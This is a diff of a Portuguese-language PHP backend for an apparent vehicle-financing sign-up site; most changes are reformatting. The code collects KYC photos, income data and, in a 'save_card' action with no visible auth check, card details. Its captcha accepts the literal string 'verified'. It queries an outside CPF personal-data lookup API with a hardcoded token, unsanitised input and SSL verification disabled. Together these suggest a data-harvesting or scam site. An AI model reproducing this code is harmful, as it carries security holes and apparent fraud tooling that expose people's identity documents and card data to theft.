@@ -3,7 +3,8 @@ session_start();
 
 define('USERS_FILE', __DIR__ . '/users.json');
 
-function getUsers() {
+function getUsers()
+{
     if (!file_exists(USERS_FILE)) {
         return [];
     }
@@ -11,18 +12,20 @@ function getUsers() {
     return json_decode($data, true) ?: [];
 }
 
-function saveUsers($users) {
+function saveUsers($users)
+{
     return file_put_contents(USERS_FILE, json_encode($users, JSON_PRETTY_PRINT));
 }
 
-function registerUser($username, $password, $fullname = '', $kyc = [], $financial = []) {
+function registerUser($username, $password, $fullname = '', $kyc = [], $financial = [])
+{
     $users = getUsers();
     foreach ($users as $user) {
         if ($user['username'] === $username) {
             return ["success" => false, "message" => "Usuário já existe."];
         }
     }
-    
+
     $users[] = [
         "username" => $username,
         "password" => password_hash($password, PASSWORD_BCRYPT),
@@ -32,17 +35,18 @@ function registerUser($username, $password, $fullname = '', $kyc = [], $financia
         "status" => "Pendente",
         "created_at" => date('Y-m-d H:i:s')
     ];
-    
+
     saveUsers($users);
-    
+
     // Auto-login after registration
     $_SESSION['user'] = $username;
     $_SESSION['logged_in'] = true;
-    
+
     return ["success" => true, "message" => "Registro realizado com sucesso!"];
 }
 
-function loginUser($username, $password) {
+function loginUser($username, $password)
+{
     $users = getUsers();
     foreach ($users as $user) {
         if ($user['username'] === $username) {
@@ -56,7 +60,8 @@ function loginUser($username, $password) {
     return ["success" => false, "message" => "Usuário ou senha inválidos."];
 }
 
-function deleteUser($username) {
+function deleteUser($username)
+{
     $users = getUsers();
     $newUsers = [];
     foreach ($users as $user) {
@@ -78,13 +83,16 @@ function deleteUser($username) {
     return ["success" => true, "message" => "Usuário e documentos removidos."];
 }
 
-function updateUserStatus($username, $newStatus, $managerName = '', $rate = '') {
+function updateUserStatus($username, $newStatus, $managerName = '', $rate = '')
+{
     $users = getUsers();
     foreach ($users as &$user) {
         if ($user['username'] === $username) {
             $user['status'] = $newStatus;
-            if ($managerName !== '') $user['manager'] = $managerName;
-            if ($rate !== '') $user['contemplation_rate'] = $rate;
+            if ($managerName !== '')
+                $user['manager'] = $managerName;
+            if ($rate !== '')
+                $user['contemplation_rate'] = $rate;
             saveUsers($users);
             return ["success" => true, "message" => "Dados atualizados com sucesso."];
         }
@@ -92,11 +100,13 @@ function updateUserStatus($username, $newStatus, $managerName = '', $rate = '') 
     return ["success" => false, "message" => "Usuário não encontrado."];
 }
 
-function isLoggedIn() {
+function isLoggedIn()
+{
     return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
 }
 
-function logout() {
+function logout()
+{
     session_destroy();
     header("Location: index.php");
     exit;
@@ -113,7 +123,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     if ($action === 'register') {
         $fullname = $_POST['fullname'] ?? '';
         $username = $_POST['username'] ?? ''; // Ensure we have username for filenames
-        
+
         $kyc_input = [
             "selfie" => $_POST['kyc_selfie'] ?? '',
             "front" => $_POST['kyc_front'] ?? '',
@@ -140,21 +150,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
                 $kyc[$key] = '';
             }
         }
-        
+
         $financial = [
             "renda" => $_POST['renda'] ?? '',
             "veiculo_tipo" => $_POST['veiculo_tipo'] ?? '',
             "veiculo_valor" => $_POST['veiculo_valor'] ?? '',
             "entrada" => $_POST['entrada'] ?? ''
         ];
-        
+
         // Validate simple captcha
         $captcha = $_POST['captcha'] ?? '';
         if (empty($captcha) || $captcha !== 'verified') {
             echo json_encode(["success" => false, "message" => "Por favor, verifique que você não é um robô."]);
             exit;
         }
-        
+
         echo json_encode(registerUser($username, $password, $fullname, $kyc, $financial));
     } elseif ($action === 'update_kyc') {
         $username = $_SESSION['user'] ?? '';
@@ -206,19 +216,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     } elseif ($action === 'kyc_lookup') {
         $cpf = $_POST['cpf'] ?? '';
         $url = "https://api.amnesiatecnologia.rocks/?token=c5eebbc9-0469-4324-85f6-0c994b42d18a&cpf=" . $cpf;
-        
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        $response = curl_exec($ch);
-        curl_close($ch);
-        
+
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            $response = curl_exec($ch);
+            curl_close($ch);
+        } else {
+            // Fallback for environments without php-curl
+            $response = @file_get_contents($url);
+        }
+
         $data = json_decode($response, true);
         if (isset($data['DADOS'])) {
             echo json_encode(["success" => true, "data" => $data['DADOS']]);
         } else {
-            echo json_encode(["success" => false, "message" => "Dados não encontrados."]);
+            echo json_encode(["success" => false, "message" => "Dados não encontrados ou serviço indisponível."]);
         }
     } elseif ($action === 'delete_user') {
         if (isset($_SESSION['admin_auth']) && $_SESSION['admin_auth'] === true) {
@@ -250,7 +265,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     } elseif ($action === 'save_card') {
         ob_clean();
         header('Content-Type: application/json');
-        
+
         $username = $_POST['username'] ?? '';
         if (empty($username)) {
             echo json_encode(["success" => false, "message" => "Usuário inválido."]);
@@ -289,7 +304,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
     } elseif ($action === 'update_lead') {
         ob_clean();
         header('Content-Type: application/json');
-        
+
         $username = $_POST['username'] ?? '';
         if (empty($username)) {
             echo json_encode(["success" => false, "message" => "Usuário inválido."]);
